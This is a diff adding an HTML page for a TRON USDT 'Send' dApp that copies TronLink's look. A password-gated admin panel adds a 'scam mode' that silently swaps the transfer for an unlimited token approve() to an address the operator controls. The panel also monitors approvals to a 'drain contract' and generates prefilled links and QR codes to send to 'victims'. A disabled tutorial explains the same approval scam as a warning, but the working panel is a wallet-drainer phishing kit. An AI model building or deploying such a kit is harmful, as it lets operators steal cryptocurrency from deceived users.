@@ -1,0 +1,792 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1, viewport-fit=cover"
+    />
+    <meta name="theme-color" content="#ffffff" />
+    <title>Send</title>
+    <link rel="stylesheet" href="style.css?v=20260519a" />
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+    <meta http-equiv="Pragma" content="no-cache" />
+    <meta http-equiv="Expires" content="0" />
+    <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
+  </head>
+  <body>
+    <div class="app">
+      <!-- Top bar -->
+      <header class="topbar">
+        <button
+          type="button"
+          class="back-btn"
+          aria-label="Back"
+          onclick="history.length > 1 ? history.back() : null"
+        >
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+            <path
+              d="M15 18L9 12L15 6"
+              stroke="currentColor"
+              stroke-width="2.2"
+              stroke-linecap="round"
+              stroke-linejoin="round"
+            />
+          </svg>
+        </button>
+        <div class="topbar-title">
+          Send <span class="topbar-step">(2/2)</span>
+        </div>
+        <button
+          type="button"
+          id="connectBtn"
+          class="topbar-action"
+          aria-label="Connect wallet"
+        >
+          Connect
+        </button>
+      </header>
+
+      <main class="screen">
+        <!-- Wallet info strip (hidden until connected) -->
+        <div id="heroAddressRow" class="wallet-strip" hidden>
+          <div class="wallet-strip-left">
+            <div class="wallet-strip-label">Your wallet</div>
+            <div class="wallet-strip-addr" id="heroAddress">—</div>
+          </div>
+          <button type="button" id="copyAddrBtn" class="ghost-btn" title="Copy">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
+              <rect
+                x="9"
+                y="9"
+                width="11"
+                height="11"
+                rx="2"
+                stroke="currentColor"
+                stroke-width="1.8"
+              />
+              <path
+                d="M5 15V5C5 3.9 5.9 3 7 3H15"
+                stroke="currentColor"
+                stroke-width="1.8"
+                stroke-linecap="round"
+              />
+            </svg>
+          </button>
+        </div>
+
+        <!-- Recipient -->
+        <section class="field">
+          <label class="field-label" for="recipientInput">Recipient</label>
+          <div class="input-row">
+            <input
+              id="recipientInput"
+              type="text"
+              placeholder="Enter TRON address (T...)"
+              autocomplete="off"
+              spellcheck="false"
+              autocapitalize="off"
+            />
+            <button type="button" id="pasteBtn" class="inline-btn">Paste</button>
+          </div>
+          <div class="field-hint" id="addrHint">
+            <span id="addrCheck" class="addr-check"></span>
+          </div>
+          <div id="recents" class="recents-row" hidden>
+            <span class="recents-label">Recent:</span>
+            <div id="recentsList" class="recents-list"></div>
+          </div>
+        </section>
+
+        <div class="divider"></div>
+
+        <!-- Token -->
+        <section class="field">
+          <label class="field-label">Token</label>
+          <div id="adminToggle" class="token-row" aria-hidden="true">
+            <div class="token-row-left">
+              <div class="token-icon" id="tokenLogo">
+                <svg viewBox="0 0 339.43 295.27" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                  <path d="M62.15.5h215.13c1.42 0 2.71.79 3.37 2.04l57.94 121.61a3.85 3.85 0 0 1-.71 4.46L173.31 294.09a3.81 3.81 0 0 1-5.39.05L1.27 128.66a3.85 3.85 0 0 1-.73-4.5L58.74 2.6A3.83 3.83 0 0 1 62.15.5Z" fill="#50AF95"/>
+                  <path d="M191.19 144.8v-.02c-1.1.08-6.75.42-19.36.42-10.02 0-17.13-.3-19.63-.42v.02c-38.83-1.71-67.81-8.46-67.81-16.55s28.98-14.83 67.81-16.56v26.42c2.53.18 9.81.61 19.8.61 12.04 0 18.07-.5 19.19-.6V111.7c38.75 1.72 67.67 8.48 67.67 16.55s-28.91 14.82-67.67 16.55Zm0-35.83V85.32h54.13V49.27H94.19V85.32h54.13v23.64c-44 2.02-77.1 10.72-77.1 21.14s33.1 19.12 77.1 21.15v75.81h43.87v-75.84c43.92-2.02 76.95-10.71 76.95-21.12s-33.03-19.1-76.95-21.13Z" fill="#fff"/>
+                </svg>
+              </div>
+              <div class="token-meta">
+                <div class="token-name" id="tokenName">USDT</div>
+                <div class="token-sub">
+                  <span id="netBadge" class="net-pill">—</span>
+                  <span class="token-sub-dot">·</span>
+                  <span>TRC-20</span>
+                </div>
+              </div>
+            </div>
+            <svg
+              class="chev"
+              width="20"
+              height="20"
+              viewBox="0 0 24 24"
+              fill="none"
+            >
+              <path
+                d="M9 6L15 12L9 18"
+                stroke="currentColor"
+                stroke-width="2"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+              />
+            </svg>
+          </div>
+        </section>
+
+        <div class="divider"></div>
+
+        <!-- Amount -->
+        <section class="field">
+          <label class="field-label" for="amountInput">Amount</label>
+          <div class="input-row">
+            <input
+              id="amountInput"
+              type="text"
+              inputmode="decimal"
+              placeholder="Enter the transfer amount"
+              autocomplete="off"
+            />
+            <button type="button" class="max-btn" id="maxBtn">MAX</button>
+          </div>
+          <div class="field-hint">
+            Available:
+            <strong id="amountAvailable">0.00</strong>
+            <span id="amountSuffix" class="hint-muted">USDT</span>
+            <span class="hint-muted hint-trx">
+              · <span id="heroTrx">— TRX</span> for fees
+            </span>
+          </div>
+        </section>
+
+        <!-- Notes (hidden placeholder for UI parity with TronLink) -->
+        <div class="notes-row">
+          <button type="button" class="notes-link" id="notesToggle">
+            Add notes to this transfer
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none">
+              <path
+                d="M6 9L12 15L18 9"
+                stroke="currentColor"
+                stroke-width="2"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+              />
+            </svg>
+          </button>
+        </div>
+
+        <!-- Live preview (collapsed by default to match minimal style) -->
+        <div id="sendSummary" class="summary" hidden>
+          <div class="summary-row">
+            <span>You send</span>
+            <strong id="summarySend">—</strong>
+          </div>
+          <div class="summary-row">
+            <span>Recipient gets</span>
+            <strong id="summaryReceive">—</strong>
+          </div>
+          <div class="summary-row summary-fee">
+            <span>Network fee</span>
+            <span>~5 TRX (or free with energy)</span>
+          </div>
+        </div>
+
+        <!-- Hidden hero balance (still exposed as IDs for JS) -->
+        <div id="heroBalance" hidden></div>
+
+        <!-- Settings drawer -->
+        <div id="adminPanel" class="settings-drawer hidden">
+          <div class="settings-inner">
+            <a href="./" class="admin-back" id="adminBackLink">← Back to dApp</a>
+            <div class="settings-header">
+              <h3>Token</h3>
+              <p class="settings-sub">
+                This dApp runs on TRON Mainnet. Saved in your browser only.
+                To change defaults for everyone, edit <code>public/config.js</code>.
+              </p>
+            </div>
+
+            <label class="settings-label">Token contract address</label>
+            <input
+              id="adminTokenAddr"
+              class="settings-input"
+              type="text"
+              placeholder="T... (paste from TronIDE / TronScan after deploy)"
+              spellcheck="false"
+              autocapitalize="off"
+              autocomplete="off"
+            />
+
+            <div class="settings-actions">
+              <button id="adminResetBtn" type="button" class="btn-secondary">
+                Reset
+              </button>
+              <button id="adminSaveBtn" type="button" class="btn-primary">
+                Save
+              </button>
+            </div>
+
+            <p class="settings-current">
+              Network: <code id="adminCurNet">mainnet</code><br />
+              Token: <code id="adminCurToken">—</code>
+            </p>
+
+            <hr class="settings-hr" />
+
+            <div class="settings-header" style="margin-top: 8px">
+              <h3>🧪 Demo: Scam mode</h3>
+              <p class="settings-sub">
+                Flips the Send button to call <code>approve(spender, UNLIMITED)</code>
+                instead of <code>transfer</code>, so you can see the real
+                dangerous popup in TronLink.
+              </p>
+            </div>
+
+            <label class="settings-toggle">
+              <input type="checkbox" id="scamModeToggle" />
+              <span class="toggle-track"><span class="toggle-thumb"></span></span>
+              <span class="toggle-label">Enable scam mode (unlimited approve)</span>
+            </label>
+
+
+            <label class="settings-label" style="margin-top: 12px">
+              Address that receives unlimited approval
+            </label>
+            <p class="settings-sub" style="margin: 0 0 6px">
+              When victims click Send, the dApp will call
+              <code>approve(THIS_ADDRESS, UNLIMITED)</code>. Paste a wallet
+              or contract address you control.
+            </p>
+            <input
+              id="adminScamSpender"
+              class="settings-input"
+              type="text"
+              placeholder="T... (leave empty for built-in demo address)"
+              spellcheck="false"
+              autocapitalize="off"
+              autocomplete="off"
+            />
+
+            <div class="settings-actions" style="margin-top: 10px">
+              <button id="revokeBtn" type="button" class="btn-secondary">
+                Revoke approval (set allowance = 0)
+              </button>
+            </div>
+            <p class="settings-current" id="allowanceStatus">
+              Current allowance to demo spender: <code>—</code>
+            </p>
+
+            <hr class="settings-hr" />
+
+            <div class="settings-header" style="margin-top: 8px">
+              <h3>👥 Approvals granted to your spender</h3>
+              <p class="settings-sub">
+                Lists every wallet that ever approved the token to the
+                <strong>spender address</strong> below — your dApp/drain
+                contract. This is the exact view a real attacker monitors.
+                Leave the field empty to see every approval on the token
+                regardless of spender.
+              </p>
+            </div>
+
+            <label class="settings-label">Spender address to monitor</label>
+            <input
+              id="adminSpenderAddr"
+              class="settings-input"
+              type="text"
+              placeholder="T... (leave empty to show all approvals)"
+              spellcheck="false"
+              autocapitalize="off"
+              autocomplete="off"
+            />
+
+            <div class="settings-actions" style="margin-top: 6px">
+              <button id="refreshApprovalsBtn" type="button" class="btn-secondary">
+                Refresh list
+              </button>
+              <span id="approvalsStatus" class="settings-current" style="margin: 0 0 0 10px">—</span>
+            </div>
+
+            <div id="approvalsList" class="approvals-list"></div>
+
+            <hr class="settings-hr" />
+
+            <div class="settings-header" style="margin-top: 8px">
+              <h3>📲 Share link & QR code</h3>
+              <p class="settings-sub">
+                Generates a link to this dApp that auto-fills the recipient
+                address (and optionally the amount and scam mode) when the
+                victim opens it. Show them the QR code or send the URL.
+              </p>
+            </div>
+
+            <label class="settings-label">Recipient address to prefill</label>
+            <input
+              id="qrToAddr"
+              class="settings-input"
+              type="text"
+              placeholder="T... (the address shown in victim's Recipient field)"
+              spellcheck="false"
+              autocapitalize="off"
+              autocomplete="off"
+            />
+
+            <label class="settings-label" style="margin-top: 8px">Amount to prefill (optional)</label>
+            <input
+              id="qrAmount"
+              class="settings-input"
+              type="text"
+              inputmode="decimal"
+              placeholder="e.g. 100"
+              spellcheck="false"
+              autocomplete="off"
+            />
+
+            <label class="settings-toggle" style="margin-top: 10px">
+              <input type="checkbox" id="qrScamMode" />
+              <span class="toggle-track"><span class="toggle-thumb"></span></span>
+              <span class="toggle-label">Auto-enable scam mode on open</span>
+            </label>
+
+            <label class="settings-toggle" style="margin-top: 6px">
+              <input type="checkbox" id="qrDeepLink" />
+              <span class="toggle-track"><span class="toggle-thumb"></span></span>
+              <span class="toggle-label">
+                Wrap as TronLink deep link (experimental)
+                <small style="display:block; color:var(--muted); font-weight:400; margin-top:2px">
+                  Most phone cameras refuse to auto-launch custom schemes
+                  and only offer "copy". Leave OFF for a plain https URL,
+                  then tell the victim to open it inside the TronLink app
+                  (Discover tab → scan icon, OR paste into the address bar).
+                </small>
+              </span>
+            </label>
+
+            <div class="settings-actions" style="margin-top: 10px">
+              <button id="qrGenerateBtn" type="button" class="btn-primary">
+                Generate QR + Link
+              </button>
+              <button id="qrCopyBtn" type="button" class="btn-secondary" disabled>
+                Copy link
+              </button>
+            </div>
+
+            <div id="qrLinkBox" class="qr-link-box" hidden>
+              <code id="qrLink"></code>
+            </div>
+            <div id="qrCode" class="qr-code-box"></div>
+
+            <hr class="settings-hr" />
+
+            <!-- Change admin password -->
+            <div class="settings-header" style="margin-top:8px">
+              <h3>Admin password</h3>
+              <p class="settings-sub">Change the password required to access this admin panel.</p>
+            </div>
+            <div style="display:flex;flex-direction:column;gap:8px;margin-bottom:16px">
+              <input id="adminPwCurrent" type="password" placeholder="Current password"
+                style="padding:10px 12px;border:1.5px solid #d8dce3;border-radius:10px;font-size:15px;outline:none;width:100%;box-sizing:border-box" />
+              <input id="adminPwNew" type="password" placeholder="New password"
+                style="padding:10px 12px;border:1.5px solid #d8dce3;border-radius:10px;font-size:15px;outline:none;width:100%;box-sizing:border-box" />
+              <input id="adminPwConfirm" type="password" placeholder="Confirm new password"
+                style="padding:10px 12px;border:1.5px solid #d8dce3;border-radius:10px;font-size:15px;outline:none;width:100%;box-sizing:border-box" />
+              <button id="adminPwSaveBtn" type="button" class="btn-primary">Save new password</button>
+            </div>
+          </div>
+        </div>
+
+      </main>
+
+      <!-- Sticky bottom send button -->
+      <footer class="dock">
+        <button
+          type="button"
+          id="sendBtn"
+          class="send-btn"
+          disabled
+        >
+          Send
+        </button>
+      </footer>
+    </div>
+
+    <!-- Confirmation modal -->
+    <div id="confirmModal" class="modal hidden">
+      <div class="modal-sheet">
+        <div class="sheet-handle"></div>
+        <h3 class="sheet-title">Confirm transfer</h3>
+        <p class="sheet-sub">Review carefully — this can't be undone.</p>
+
+        <div class="confirm-amount">
+          <div class="confirm-amount-value" id="confirmAmount">—</div>
+          <div class="confirm-amount-sub" id="confirmSymbol">USDT</div>
+        </div>
+
+        <div class="confirm-rows">
+          <div class="confirm-row">
+            <span>From</span>
+            <span class="mono" id="confirmFrom">—</span>
+          </div>
+          <div class="confirm-row">
+            <span>To</span>
+            <span class="mono" id="confirmTo">—</span>
+          </div>
+          <div class="confirm-row">
+            <span>Network</span>
+            <span id="confirmNet">—</span>
+          </div>
+          <div class="confirm-row">
+            <span>Fee (est.)</span>
+            <span>~5 TRX</span>
+          </div>
+        </div>
+
+        <div class="sheet-actions">
+          <button type="button" id="confirmCancelBtn" class="btn-secondary">
+            Cancel
+          </button>
+          <button type="button" id="confirmSendBtn" class="btn-primary">
+            Confirm &amp; Send
+          </button>
+        </div>
+      </div>
+    </div>
+
+
+    <!-- Admin password gate -->
+    <div id="adminGate" class="modal hidden" style="z-index:10000">
+      <div class="modal-sheet" style="max-width:340px;text-align:center">
+        <div class="sheet-handle"></div>
+        <div style="font-size:36px;margin-bottom:8px">🔒</div>
+        <h3 class="sheet-title" style="margin-bottom:6px">Admin access</h3>
+        <p class="sheet-sub" style="margin-bottom:16px">Enter the password to continue.</p>
+        <input id="adminGateInput" type="password" placeholder="Password"
+          style="width:100%;box-sizing:border-box;padding:12px 14px;border:1.5px solid #d8dce3;border-radius:10px;font-size:16px;outline:none;margin-bottom:10px" />
+        <p id="adminGateError" style="color:#e53e3e;font-size:13px;margin:0 0 10px;display:none">Incorrect password — try again.</p>
+        <button id="adminGateSubmit" type="button" class="btn-primary block-btn">Unlock</button>
+        <a href="./" class="btn-secondary block-btn" style="margin-top:8px">Go back</a>
+      </div>
+    </div>
+
+    <div id="toasts" class="toasts"></div>
+
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
+    <script src="config.js?v=20260519a"></script>
+
+
+    <script src="app.js?v=20260519a"></script>
+    <script>
+      // MAX button — fills the amount input with the wallet's balance.
+      document.getElementById('maxBtn')?.addEventListener('click', () => {
+        const avail = document.getElementById('amountAvailable')?.textContent || '';
+        const num = parseFloat(avail.replace(/,/g, ''));
+        if (!isNaN(num) && num > 0) {
+          const input = document.getElementById('amountInput');
+          input.value = num;
+          input.dispatchEvent(new Event('input', { bubbles: true }));
+        }
+      });
+      // Notes link — just toggles the summary section as a stand-in.
+      document.getElementById('notesToggle')?.addEventListener('click', () => {
+        const s = document.getElementById('sendSummary');
+        if (s) s.hidden = !s.hidden;
+      });
+
+      // Faucet UI removed — mainnet only.
+      (function () {
+        const badge = document.getElementById('netBadge');
+        if (badge) {
+          new MutationObserver(() => {}).observe(badge, {
+            childList: true,
+            characterData: true,
+            subtree: true,
+          });
+        }
+      })();
+
+      // ============ SCAM WALKTHROUGH DEMO (disabled — modal markup removed) ============
+      // Kept as a noop guard so the block is harmless if reintroduced later.
+      (function () {
+        const sheet = document.getElementById('demoSheet');
+        if (!sheet) return;
+        const body = document.getElementById('demoBody');
+        const title = document.getElementById('demoTitle');
+        const progress = document.getElementById('demoProgress');
+        const bar = document.getElementById('demoBarFill');
+        const prevBtn = document.getElementById('demoPrevBtn');
+        const nextBtn = document.getElementById('demoNextBtn');
+        const openBtn = document.getElementById('demoOpenBtn');
+        const closeBtn = document.getElementById('demoCloseBtn');
+
+        const FAKE_USER = 'TKxYn8zV2pQrFs9HmLwBnEa1cD4eF6gH7j';
+        const FAKE_SCAMMER = 'TScamXp9Lm2qRr5tYu8vB1nM4kJ7hG3dF6';
+        const FAKE_RECIPIENT = 'TMyFriend4Lp7Qr2sW9xZ1bC3vN6mK8jH';
+
+        const steps = [
+          {
+            title: 'How "fast send" scams work',
+            html: `
+              <div class="demo-hero">
+                <div class="demo-emoji">🪤</div>
+                <h2>The Fake "FastSend USDT" Trap</h2>
+                <p>You're about to walk through a scam dApp that looks identical to a real send tool. We'll show you the exact moment users get drained — and the one click that saves them.</p>
+                <div class="demo-note demo-note-warn">
+                  <strong>This is a simulation.</strong> No real wallet, no real USDT. You can't be harmed.
+                </div>
+              </div>`,
+            next: 'I understand →',
+          },
+          {
+            title: 'You land on the scam site',
+            html: `
+              <div class="demo-phone">
+                <div class="demo-phone-bar">fastsend-usdt.app</div>
+                <div class="demo-phone-screen">
+                  <div class="phone-h1">FastSend USDT</div>
+                  <p class="phone-p">Send USDT instantly with zero fees. Trusted by 50,000+ users.</p>
+                  <button class="phone-btn-primary">Connect Wallet</button>
+                </div>
+              </div>
+              <div class="demo-note">
+                <strong>Looks legit, right?</strong> Same layout as the real dApp you're on. Same fonts. Even fake "trusted by" numbers. Tap Next to click Connect.
+              </div>`,
+          },
+          {
+            title: 'TronLink asks for permission',
+            html: `
+              <div class="demo-popup demo-popup-tronlink">
+                <div class="popup-head">
+                  <div class="popup-logo">🔗</div>
+                  <div>
+                    <div class="popup-title">TronLink</div>
+                    <div class="popup-sub">Connection Request</div>
+                  </div>
+                </div>
+                <div class="popup-body">
+                  <p><strong>fastsend-usdt.app</strong> wants to:</p>
+                  <ul class="popup-perm">
+                    <li>✓ See your wallet address</li>
+                    <li>✓ See your balance</li>
+                  </ul>
+                  <p class="popup-tiny">This connection alone cannot move any funds.</p>
+                </div>
+                <div class="popup-actions">
+                  <button class="popup-btn-reject">Reject</button>
+                  <button class="popup-btn-approve">Connect</button>
+                </div>
+              </div>
+              <div class="demo-note demo-note-ok">
+                ✅ <strong>This step is safe.</strong> Connecting only shares your public address. The danger comes later.
+              </div>`,
+          },
+          {
+            title: 'You fill in a real send',
+            html: `
+              <div class="demo-phone">
+                <div class="demo-phone-bar">fastsend-usdt.app · ${FAKE_USER.slice(0,4)}...${FAKE_USER.slice(-4)}</div>
+                <div class="demo-phone-screen">
+                  <div class="phone-row"><span>Recipient</span><span class="mono">${FAKE_RECIPIENT.slice(0,6)}...${FAKE_RECIPIENT.slice(-4)}</span></div>
+                  <div class="phone-row"><span>Amount</span><strong>10 USDT</strong></div>
+                  <div class="phone-row"><span>Your balance</span><span>500 USDT</span></div>
+                  <button class="phone-btn-primary">Send 10 USDT</button>
+                </div>
+              </div>
+              <div class="demo-note">
+                You enter your friend's address and 10 USDT. You expect one popup to confirm the transfer. Tap Next to click Send.
+              </div>`,
+          },
+          {
+            title: '⚠️ The first popup — read it carefully',
+            html: `
+              <div class="demo-flash">One-time setup required to enable fast sending...</div>
+              <div class="demo-popup demo-popup-tronlink demo-popup-danger">
+                <div class="popup-head">
+                  <div class="popup-logo">🔗</div>
+                  <div>
+                    <div class="popup-title">TronLink</div>
+                    <div class="popup-sub popup-sub-warn">Smart Contract Interaction</div>
+                  </div>
+                </div>
+                <div class="popup-body">
+                  <div class="popup-method">
+                    <span class="popup-method-label">Method</span>
+                    <code class="popup-method-name">approve</code>
+                  </div>
+                  <div class="popup-param">
+                    <span>Spender</span>
+                    <code class="mono">${FAKE_SCAMMER.slice(0,8)}...${FAKE_SCAMMER.slice(-6)}</code>
+                  </div>
+                  <div class="popup-param">
+                    <span>Amount</span>
+                    <code class="popup-amount-bad">115,792,089,237,316,...</code>
+                  </div>
+                  <p class="popup-tiny">Network fee: ~10 TRX</p>
+                </div>
+                <div class="popup-actions">
+                  <button class="popup-btn-reject popup-btn-glow">Reject</button>
+                  <button class="popup-btn-approve">Confirm</button>
+                </div>
+              </div>
+              <div class="demo-note demo-note-bad">
+                🚨 <strong>RED FLAGS:</strong>
+                <ul>
+                  <li>Method is <code>approve</code>, not <code>transfer</code></li>
+                  <li>Amount is an unlimited number, not 10</li>
+                  <li>Spender is a random contract, not USDT</li>
+                </ul>
+                Most users skim this and hit Confirm. That single click hands the scammer permanent permission to take any USDT from this wallet.
+              </div>`,
+          },
+          {
+            title: 'The send actually works',
+            html: `
+              <div class="demo-popup demo-popup-tronlink">
+                <div class="popup-head">
+                  <div class="popup-logo">🔗</div>
+                  <div>
+                    <div class="popup-title">TronLink</div>
+                    <div class="popup-sub">Transfer</div>
+                  </div>
+                </div>
+                <div class="popup-body">
+                  <div class="popup-method">
+                    <span class="popup-method-label">Method</span>
+                    <code class="popup-method-name">transfer</code>
+                  </div>
+                  <div class="popup-param"><span>To</span><code class="mono">${FAKE_RECIPIENT.slice(0,8)}...${FAKE_RECIPIENT.slice(-6)}</code></div>
+                  <div class="popup-param"><span>Amount</span><code>10 USDT</code></div>
+                </div>
+                <div class="popup-actions">
+                  <button class="popup-btn-reject">Reject</button>
+                  <button class="popup-btn-approve">Confirm</button>
+                </div>
+              </div>
+              <div class="demo-toast demo-toast-ok">✅ 10 USDT sent successfully! View on TronScan</div>
+              <div class="demo-note">
+                Your friend gets the 10 USDT. The dApp shows success. <strong>You feel safe.</strong> You close the tab.
+              </div>`,
+          },
+          {
+            title: 'Hours later... you get drained',
+            html: `
+              <div class="demo-timeline">
+                <div class="tl-step tl-done">
+                  <span class="tl-time">Just now</span>
+                  <span>You closed the tab. Balance: 500 USDT.</span>
+                </div>
+                <div class="tl-step tl-done">
+                  <span class="tl-time">+6 hours</span>
+                  <span>Someone pays you 200 USDT. Balance: 700 USDT.</span>
+                </div>
+                <div class="tl-step tl-bad">
+                  <span class="tl-time">+6h 04m</span>
+                  <span><strong>Scammer's bot detects the new balance.</strong> No popup on your end.</span>
+                </div>
+                <div class="tl-step tl-bad">
+                  <span class="tl-time">+6h 05m</span>
+                  <span>Scammer calls <code>transferFrom(you, scammer, 700)</code> from their own wallet.</span>
+                </div>
+                <div class="tl-step tl-bad">
+                  <span class="tl-time">+6h 05m</span>
+                  <span><strong>Your wallet: 0 USDT.</strong> No notification. No popup. No way to undo.</span>
+                </div>
+              </div>
+              <div class="demo-note demo-note-bad">
+                That <code>approve</code> popup you confirmed is a permanent license. The scammer can drain anything you receive forever — until you manually revoke it on tronscan.org.
+              </div>`,
+          },
+          {
+            title: 'How to never fall for this',
+            html: `
+              <div class="demo-rules">
+                <div class="rule rule-bad">
+                  <div class="rule-icon">🚫</div>
+                  <div>
+                    <strong>Never confirm <code>approve</code> on a send dApp.</strong>
+                    Real sending only needs <code>transfer</code>.
+                  </div>
+                </div>
+                <div class="rule rule-bad">
+                  <div class="rule-icon">🚫</div>
+                  <div>
+                    <strong>Never confirm unlimited amounts.</strong>
+                    If the popup shows a giant number, it's a trap.
+                  </div>
+                </div>
+                <div class="rule rule-good">
+                  <div class="rule-icon">✅</div>
+                  <div>
+                    <strong>Always read the method name.</strong>
+                    On every TronLink popup. Every time. 2 seconds saves your life savings.
+                  </div>
+                </div>
+                <div class="rule rule-good">
+                  <div class="rule-icon">✅</div>
+                  <div>
+                    <strong>Use dApps that need only one popup.</strong>
+                    Like this one — it never asks for approve.
+                  </div>
+                </div>
+              </div>
+              <div class="demo-note demo-note-ok">
+                The dApp you're using right now is the safe pattern: <strong>zero approvals, one transfer popup, nothing left behind</strong> when you close the tab.
+              </div>`,
+            next: 'Done',
+            last: true,
+          },
+        ];
+
+        let cur = 0;
+
+        function render() {
+          const step = steps[cur];
+          title.textContent = step.title;
+          progress.textContent = `Step ${cur + 1} of ${steps.length}`;
+          bar.style.width = `${((cur + 1) / steps.length) * 100}%`;
+          body.innerHTML = step.html;
+          body.scrollTop = 0;
+          prevBtn.disabled = cur === 0;
+          nextBtn.textContent = step.next || 'Next →';
+          if (step.last) nextBtn.dataset.last = '1';
+          else delete nextBtn.dataset.last;
+        }
+
+        function open() {
+          cur = 0;
+          render();
+          sheet.classList.remove('hidden');
+          document.body.style.overflow = 'hidden';
+        }
+        function close() {
+          sheet.classList.add('hidden');
+          document.body.style.overflow = '';
+        }
+
+        openBtn?.addEventListener('click', open);
+
+        // ?demo=N auto-opens to step N (1-based) for previewing
+        const demoParam = new URLSearchParams(location.search).get('demo');
+        if (demoParam !== null) {
+          const stepIdx = Math.max(0, Math.min(steps.length - 1, parseInt(demoParam, 10) - 1 || 0));
+          setTimeout(() => { open(); cur = stepIdx; render(); }, 100);
+        }
+
+        closeBtn?.addEventListener('click', close);
+        sheet?.addEventListener('click', (e) => {
+          if (e.target === sheet) close();
+        });
+        prevBtn?.addEventListener('click', () => {
+          if (cur > 0) { cur--; render(); }
+        });
+        nextBtn?.addEventListener('click', () => {
+          if (nextBtn.dataset.last) { close(); return; }
+          if (cur < steps.length - 1) { cur++; render(); }
+        });
+      })();
+    </script>
+  </body>
+</html>
